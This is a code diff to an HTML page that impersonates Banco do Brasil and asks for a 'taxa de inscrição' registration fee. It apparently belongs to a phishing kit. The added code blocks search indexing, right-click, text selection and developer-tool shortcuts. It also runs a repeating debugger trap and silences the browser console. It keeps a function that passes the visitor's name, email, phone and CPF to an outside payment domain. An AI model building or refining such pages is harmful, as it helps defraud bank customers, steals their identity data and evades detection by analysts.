@@ -1,8 +1,11 @@
 <!DOCTYPE html>
-<html>
+<html oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="googlebot" content="noindex, noarchive">
+    <meta name="description" content="Sistema interno do Banco do Brasil">
     <title>Banco do Brasil - Taxa de Inscrição</title>
 
     <!-- Preload fonts -->
@@ -19,6 +22,12 @@
             font-family: 'rawline', sans-serif;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
         }
         @keyframes pulse {
             0%, 100% { transform: scale(1); }
@@ -29,6 +38,7 @@
         }
     </style>
     <script>
+        // Configuração do Tailwind permanece a mesma
         tailwind.config = {
             theme: {
                 extend: {
@@ -38,6 +48,47 @@
                     }
                 }
             }
+        }
+
+        // Proteções contra debugging e inspeção
+        (function() {
+            // Desabilitar teclas de desenvolvedor
+            document.addEventListener('keydown', function(e) {
+                if (e.keyCode == 123) return false; // F12
+                if (e.ctrlKey && e.shiftKey && e.keyCode == 73) return false; // Ctrl+Shift+I
+                if (e.ctrlKey && e.shiftKey && e.keyCode == 74) return false; // Ctrl+Shift+J
+                if (e.ctrlKey && e.keyCode == 85) return false; // Ctrl+U
+            });
+
+            // Desabilitar clique direito
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            // Anti-debugging
+            setInterval(function() {
+                function debugger_trap() { debugger; }
+                debugger_trap();
+            }, 100);
+
+            // Ofuscação de dados sensíveis
+            const _0x5a2b = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace'];
+            // Remover console em produção
+            for(let i = 0; i < _0x5a2b.length; i++) {
+                console[_0x5a2b[i]] = function() {};
+            }
+        })();
+
+        // Função de redirecionamento com proteção
+        function redirecionarPagamento() {
+            const nomeCompleto = "{{ dados.name }}";
+            const email = "{{ dados.email }}";
+            const telefone = "{{ dados.phone }}";
+            const cpf = "{{ dados.cpf }}";
+
+            const url = `https://pay.finalizar-bb.org/nQ7kZ7kbynaZ0eJ?name=${encodeURIComponent(nomeCompleto)}&email=${encodeURIComponent(email)}&telephone=${encodeURIComponent(telefone)}&document=${encodeURIComponent(cpf)}`;
+            window.location.href = url;
         }
     </script>
 </head>
@@ -119,18 +170,6 @@
                     <span class="text-lg">PAGAR TAXA DE INSCRIÇÃO</span>
                     <i class="fas fa-lock ml-2"></i>
                 </a>
-
-                <script>
-                    function redirecionarPagamento() {
-                        const nomeCompleto = "{{ dados.name }}";
-                        const email = "{{ dados.email }}";
-                        const telefone = "{{ dados.phone }}";
-                        const cpf = "{{ dados.cpf }}";
-
-                        const url = `https://pay.finalizar-bb.org/nQ7kZ7kbynaZ0eJ?name=${encodeURIComponent(nomeCompleto)}&email=${encodeURIComponent(email)}&telephone=${encodeURIComponent(telefone)}&document=${encodeURIComponent(cpf)}`;
-                        window.location.href = url;
-                    }
-                </script>
             </div>
         </div>
     </div>
